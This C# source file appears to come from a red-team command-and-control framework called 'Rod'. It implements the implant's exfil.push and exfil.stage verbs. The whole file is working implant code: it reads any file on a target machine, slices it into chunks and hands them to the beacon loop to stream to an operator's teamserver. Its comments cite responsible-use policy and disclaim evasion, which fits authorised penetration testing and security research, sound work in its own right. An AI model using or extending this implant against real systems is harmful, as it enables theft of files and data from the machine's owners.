using System.Text;
using Rod.V1;

namespace Rod.Implant.Internal;

// Holds the exfil.* verbs the reference implant advertises (architecture.md
// Sec 10.1, ADR 0004). exfil.push streams a file off the target to the
// teamserver as ExfilChunk frames, terminating at the artifact store scoped to
// the engagement; exfil.stage reports what the implant has staged locally for a
// follow-up push. The reference implant has no durable staging area -- files
// are read on demand -- so exfil.stage reports an empty manifest, the
// documented behavior for an implant that pushes rather than stages.
//
// Argument shape:
//
//   exfil.push  <name> <path>     name identifies the artifact; path is read
//   exfil.push  <name>            name only, no payload to stream
//   exfil.stage  [<name>]         optional name filter; lists staged entries
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Exfil
{
    /// <summary>
    /// Streams a file off the target as ExfilChunk frames. The name identifies
    /// the artifact in the teamserver's store; the path is the file to read. A
    /// missing path is a name-only staging invocation; a directory is Failed;
    /// a successful read returns Succeeded with a manifest line and the chunk
    /// list populated. The beacon loop writes the TaskResult first, then
    /// iterates the chunks as ExfilChunk frames (architecture.md Sec 10.1
    /// exfil, Sec 11).
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Push(string arguments)
    {
        if (!TryParsePushArgs(arguments, out var name, out var path))
            return (TaskOutcome.Failed, "exfil.push expects '<name> <path>'", Array.Empty<ExfilChunk>());

        if (path.Length == 0)
        {
            // Name-only invocation: announce the artifact without streaming
            // bytes. Succeeded with a marker so the audit trail shows the
            // intent; no chunks cross the wire.
            return (TaskOutcome.Succeeded, $"staged {name} (no payload streamed)", Array.Empty<ExfilChunk>());
        }

        if (!System.IO.File.Exists(path))
        {
            if (Directory.Exists(path))
                return (TaskOutcome.Failed,
                    "exfil.push refuses to stream a directory: " + path, Array.Empty<ExfilChunk>());
            return (TaskOutcome.Failed, "stat " + path + ": file not found", Array.Empty<ExfilChunk>());
        }

        byte[] data;
        try
        {
            data = System.IO.File.ReadAllBytes(path);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "read " + path + ": " + ex.Message, Array.Empty<ExfilChunk>());
        }

        var contentType = SniffContentType(path);
        var chunks = ChunkFile(name, contentType, data);
        return (TaskOutcome.Succeeded,
            $"pushed {name}: {data.Length} bytes, {chunks.Count} chunks", chunks);
    }

    /// <summary>
    /// Reports what the implant has staged locally for a follow-up push. The
    /// reference implant has no durable staging area -- files are read on
    /// demand by collect.file and exfil.push -- so this always reports an empty
    /// manifest. It exists as the documented counterpart to exfil.push so the
    /// capability registry stays complete and operators can probe the verb
    /// without a Failed outcome.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Stage(string arguments)
        => (TaskOutcome.Succeeded,
            "(no local staging area; use collect.file or exfil.push to stream on demand)",
            Array.Empty<ExfilChunk>());

    // Slices a byte buffer into ExfilChunk frames of Collect.ChunkSize, stamping
    // a terminal flag on the last chunk so the server reassembles and flushes
    // the artifact. Sequence numbers start at 1. Mirrors Collect.ChunkFile but
    // is duplicated here so the two verbs stay independently readable.
    private static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
    {
        const int chunkSize = 512 * 1024; // 512 KiB
        if (data.Length == 0)
        {
            return new[]
            {
                new ExfilChunk
                {
                    Name = name,
                    ContentType = contentType,
                    Sequence = 1,
                    Terminal = true,
                },
            };
        }
        var chunks = new List<ExfilChunk>();
        for (var offset = 0; offset < data.Length; offset += chunkSize)
        {
            var end = Math.Min(offset + chunkSize, data.Length);
            var slice = new byte[end - offset];
            Array.Copy(data, offset, slice, 0, slice.Length);
            chunks.Add(new ExfilChunk
            {
                Name = name,
                ContentType = contentType,
                Sequence = (ulong)(chunks.Count + 1),
                Terminal = end == data.Length,
                Data = Google.Protobuf.ByteString.CopyFrom(slice),
            });
        }
        return chunks;
    }

    // Splits "<name> <path>" into the two parts. The path keeps its internal
    // whitespace; only the first token is the name. Returns false when no
    // fields are present. A single field is valid (name-only) with empty path.
    private static bool TryParsePushArgs(string arguments, out string name, out string path)
    {
        name = string.Empty;
        path = string.Empty;
        var fields = arguments.Split(AnySpace, StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length == 0)
            return false;
        name = fields[0];
        if (fields.Length > 1)
            path = string.Join(' ', fields, 1, fields.Length - 1);
        return true;
    }

    // Returns a best-effort content type from the extension, defaulting to
    // application/octet-stream. Conservative on purpose: the operator asked for
    // the file, not a parsed rendering.
    private static string SniffContentType(string path)
    {
        var ext = Path.GetExtension(path).ToLowerInvariant();
        return ext switch
        {
            ".txt" or ".log" => "text/plain",
            ".json" => "application/json",
            ".xml" => "application/xml",
            ".csv" => "text/csv",
            ".html" or ".htm" => "text/html",
            ".png" => "image/png",
            ".jpg" or ".jpeg" => "image/jpeg",
            ".pdf" => "application/pdf",
            _ => "application/octet-stream",
        };
    }

    private static readonly char[] AnySpace = { ' ' };
}
